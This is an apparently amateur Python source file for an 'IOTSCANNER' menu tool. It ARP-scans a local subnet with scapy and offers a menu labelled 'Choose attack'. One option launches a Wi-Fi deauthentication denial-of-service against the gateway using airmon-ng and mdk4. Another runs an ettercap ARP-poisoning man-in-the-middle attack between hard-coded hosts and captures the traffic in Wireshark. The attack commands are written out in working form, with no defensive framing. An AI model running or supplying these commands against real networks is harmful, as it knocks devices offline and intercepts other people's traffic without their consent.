#import ps
import nmap
import scapy.all as scapy
import os
from termcolor import colored
import subprocess
import argparse
import time
import pyfiglet



def root():
    from pyfiglet import Figlet
    f = Figlet(font='banner3-D')
    print(colored(f.renderText('IOT'),'red'))
    f=Figlet(font='banner3-D')
    print(colored(f.renderText('SCANNER'),'green'))


    print("0.Check your ip")
import argparse

'''
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target', help='Target IP Address/Adresses')
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify an IP Address or Addresses, use --help for more info.")
    return options
'''
'''

# initialize the port scanner
def port():
    nmScan = nmap.PortScanner()
    # scan localhost for ports in range 21-443
    nmScan.scan('10.42.0.186', '1-9000')
    # run a loop to print all the found result about the ports
    for host in nmScan.all_hosts():
        print('Host : %s (%s)' % (host, nmScan[host].hostname()))
        print('State : %s' % nmScan[host].state())
        for proto in nmScan[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)

            lport = nmScan[host][proto].keys()
            lport.sort()
            for port in lport:
                print('port : %s\tstate : %s' % (port, nmScan[host][proto][port]['state']))
'''
ip='10.42.0.1/24'
def scan(ip):
    arp_req_frame = scapy.ARP(pdst=ip)

    broadcast_ether_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame

    answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout=1, verbose=False)[0]
    result = []
    for i in range(0, len(answered_list)):
        client_dict = {"ip": answered_list[i][1].psrc, "mac": answered_list[i][1].hwsrc}
        result.append(client_dict)

    #gateway_ip=result[0]["ip"]
    #gateway_mac=result[0]["mac"]
    #print(gateway_mac,gateway_ip)

    #victim_ip=result[1]["ip"]
    #victim_mac=result[1]["mac"]
    return result


def start(result):
    print("-----------------------------------\n   IP Address\tMAC Address\n-----------------------------------")
    for i in result:
        print("->""{}\t{}".format(i["ip"], i["mac"]))
    x=result[0]

'''
options = get_args()
#scanned_output = scan(options.target)'''
scanned_output=scan(ip)
#start(scanned_output)


def root():
    print('''
    #######################################################
    |   Welcome                                           |
    |           to                                        |
    |               IOTSCANNER                            |
    #######################################################
    ''')


    print("1.Explore targets")
    print("2.Scan for ports and services on the device")
    print("3.Ddos attack on the Gateway")
    print("4.Man in the middle attack")

    x = int(input("Choose attack:"))
    if x==0:
        os.system("xterm -hold -e sudo ifconfig")
    if x==1:
        os.system("xterm -hold -e sudo python3 d.py")

    if x==2:
        os.system("xterm -hold -e sudo python ps.py")

    if x==3:
        os.system("xterm -hold -e sudo airmon-ng start wlan0")
        os.system("xterm -hold -e sudo airmon-ng check-kill")
        os.system("xterm -hold -e sudo mdk4 wlan0mon d")
        os.system("xterm -hold -e sudo airmon-ng stop wlan0mon")

    if x==4:
        os.system("xterm -hold -e sudo ettercap -T -S -i wlx00177c7a4291 -M arp:remote /192.168.12.1// /192.168.12.88//")
        os.system("xterm -hold -e sudo wireshark")

    if x==1:

        start(scanned_output)

    if x==2:
        stream = os.popen('sudo python ps.py')
        output = stream.read()
        print(output)

root()
